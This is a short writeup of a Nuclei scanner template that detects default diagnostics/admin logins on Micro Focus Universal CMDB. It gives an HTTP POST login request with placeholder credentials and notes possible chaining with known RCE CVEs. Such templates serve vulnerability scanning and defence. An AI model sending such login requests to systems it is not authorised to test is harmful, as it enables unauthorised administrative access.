# Nuclei Template: Micro Focus Universal CMDB Default Login
**Template ID:** ucmdb-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`ucmdb-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Micro Focus Universal CMDB default login credentials were discovered for diagnostics/admin. Note there is potential for this to be chained together with other vulnerabilities as with CVE-2020-11853 and CVE-2020-11854.

## Steps to reproduce / Exploit Payload
```http
POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1
Host: {{Hostname}}

customerID=1&isEncoded=false&userName={{username}}&password={{base64(password)}}&ldapServerName=UCMDB
```

## References
- https://packetstormsecurity.com/files/161182/Micro-Focus-UCMDB-Remote-Code-Execution.htm
